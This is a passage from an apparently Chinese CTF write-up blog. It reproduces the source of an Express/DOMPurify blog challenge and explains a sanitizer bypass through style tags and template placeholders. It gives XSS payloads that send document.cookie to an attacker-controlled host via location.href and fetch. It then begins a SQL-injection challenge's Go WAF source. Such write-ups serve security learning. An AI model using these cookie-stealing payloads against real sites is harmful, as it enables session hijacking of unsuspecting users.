src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312200534311.png" alt="image-20250312200534311"></p><p>æˆåŠŸè§£æ</p><h2 id="safe-layout-revenge"><a href="#safe-layout-revenge" class="headerlink" title="safe layout revenge"></a>safe layout revenge</h2><p>æ€ä¹ˆå›½é™…èµ›å…¨æ˜¯xsså•Š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express&#x27;</span>;<br><span class="hljs-keyword">import</span> session <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-session&#x27;</span>;<br><span class="hljs-keyword">import</span> rateLimit <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-rate-limit&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; randomBytes &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;crypto&#x27;</span>;<br><span class="hljs-keyword">import</span> createDOMPurify <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;dompurify&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-variable constant_">JSDOM</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jsdom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-variable language_">window</span> &#125; = <span class="hljs-keyword">new</span> <span class="hljs-title function_">JSDOM</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DOMPurify</span> = <span class="hljs-title function_">createDOMPurify</span>(<span class="hljs-variable language_">window</span>);<br><br><span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_LAYOUT</span> = <span class="hljs-string">`</span><br><span class="hljs-string">&lt;article&gt;</span><br><span class="hljs-string">  &lt;h1&gt;Blog Post&lt;/h1&gt;</span><br><span class="hljs-string">  &lt;div&gt;&#123;&#123;content&#125;&#125;&lt;/div&gt;</span><br><span class="hljs-string">&lt;/article&gt;</span><br><span class="hljs-string">`</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LENGTH_LIMIT</span> = <span class="hljs-number">500</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>  app.<span class="hljs-title function_">use</span>(<br>    <span class="hljs-string">&#x27;/api&#x27;</span>,<br>    <span class="hljs-title function_">rateLimit</span>(&#123;<br>      <span class="hljs-attr">windowMs</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,<br>      <span class="hljs-attr">max</span>: <span class="hljs-number">10</span>,<br>    &#125;),<br>  );<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>  <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,<br>&#125;));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, _, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Cache-Control&#x27;</span>, <span class="hljs-string">&#x27;no-store&#x27;</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;home&#x27;</span>, &#123;<br>    <span class="hljs-attr">posts</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>,<br>    <span class="hljs-attr">maxLayout</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>,<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/post/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">params</span>;<br>  <span class="hljs-keyword">const</span> body = posts.<span class="hljs-title function_">get</span>(id);<br>  <span class="hljs-keyword">if</span> (body === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post not found&#x27;</span>);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;post&#x27;</span>, &#123; id, body &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/clear&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;cleared&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Web server running on port 3000&#x27;</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>ä¸»è¦çœ‹è¿™é‡Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>ä¸ä»…è¿‡æ»¤äº†<code>ALLOWED_ATTR: [],</code>è¿˜è¿‡æ»¤äº†<code>ALLOW_ARIA_ATTR: false, ALLOW_DATA_ATTR: false,</code>é‚£<code>aria</code> å’Œ <code>data</code>ä¹Ÿç”¨ä¸äº†äº†</p><p>æˆ‘ä»¬éœ€è¦åœ¨ä¸ä½¿ç”¨å±æ€§çš„æƒ…å†µä¸‹æ’å…¥ä¸€ä¸ªæ¶æ„æ ‡ç­¾ã€‚é€šå¸¸ï¼Œæ¶æ„æ ‡ç­¾è¦ä¹ˆä¼šè¢«ç§»é™¤ï¼Œè¦ä¹ˆä¼šè¢«è½¬ä¹‰ï¼Œä½†æˆ‘ä»¬å¯ä»¥åœ¨ <code>&lt;style&gt;</code> ä¸­æ’å…¥æœªè¢«è½¬ä¹‰çš„å°–æ‹¬å·ã€‚</p><p>DOMPurify éå¸¸ä¸¥æ ¼ï¼Œä¼šè¿‡æ»¤æ‰ <code>&lt;style&gt;</code> ä¸­çš„ä»»ä½• HTML æ ‡ç­¾ã€‚ç„¶è€Œï¼Œæ­£åˆ™è¡¨è¾¾å¼åªæ£€æŸ¥ <code>/&lt;[/\w]/</code>ï¼Œæ‰€ä»¥ <code>&lt;&#123;&#123;content&#125;&#125;</code> ä¸ä¼šè¢«è¿‡æ»¤ï¼Œå¹¶ä¸”å¯ä»¥ç”¨æ¥æ’å…¥æ¶æ„æ ‡ç­¾</p><p>1.CVE-2023-48219</p><p>æ›¿æ¢<code>&#123;&#123;content&#125;&#125;</code>ä¸ºç©ºæ¥é€ƒè„±</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br>&#123; <span class="hljs-string">&quot;layout&quot;</span>: <span class="hljs-string">&quot;s&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;script&gt;location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//xxx.xxx.xxx.xxx:xxxx?flag=&quot;+document.cookie;&lt;&#123;&#123;content&#125;&#125;/script&gt;test&lt;/style&gt;&quot; &#125;</span><br><br>&#123; <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;layoutId&quot;</span>: <span class="hljs-number">2</span> &#125;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ª<code>&#123;&#123;content&#125;&#125;</code>ç”¨æ¥é—­åˆ<code>style</code>æ ‡ç­¾,ç¬¬äºŒä¸ª<code>&#123;&#123;content&#125;&#125;</code>ç”¨æ¥åˆ›å»º<code>script</code>æ ‡ç­¾</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312123632707.png" alt="image-20250312123632707"></p><p>æˆåŠŸè·³è½¬</p><p>2.æ„é€ æ¶æ„xss</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">logoutï¼š a&lt;style&gt;&#123;&#123;content&#125;&#125;&lt;&#123;&#123;content&#125;&#125;&lt;/style&gt;<br><br>contentï¼š img src onerror=<span class="hljs-title function_">fetch</span>(<span class="hljs-string">`&#123;YOUR_URL&#125;/`</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>) &lt;style&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>æ¥ä½¿ç”¨<code>fetch</code>ä¹Ÿå¯ä»¥ï¼Œéƒ½æ˜¯åˆ©ç”¨éæ¶æ„æ ‡ç­¾<code>&lt;style&gt;</code>æ¥æ„é€ <code>xss</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312202007357.png" alt="image-20250312202007357"></p><h2 id="Are-you-incognito"><a href="#Are-you-incognito" class="headerlink" title="Are you incognito?"></a>Are you incognito?</h2><p><a href="https://ouuan.moe/post/2025/03/tpctf-2025#are-you-incognito-3-solves">è§£æ³•1</a></p><p>ä»–ä»¬è¯´æ˜¯0dayï¼Œæˆ‘ä¸åˆ°å•Šï¼Œ0dayæ‹¿æ¥å‡ºé¢˜å—ğŸ˜­ğŸ˜…</p><p>å¤ç°ä¸æ˜ç™½å¯è¿˜è¡ŒğŸ˜…</p><h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>æºç ï¼š<br>wafå‡½æ•°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;mime&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;regexp&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> backendURL = <span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span><br><span class="hljs-keyword">const</span> backendHost = <span class="hljs-string">&quot;127.0.0.1:8000&quot;</span><br><br><span 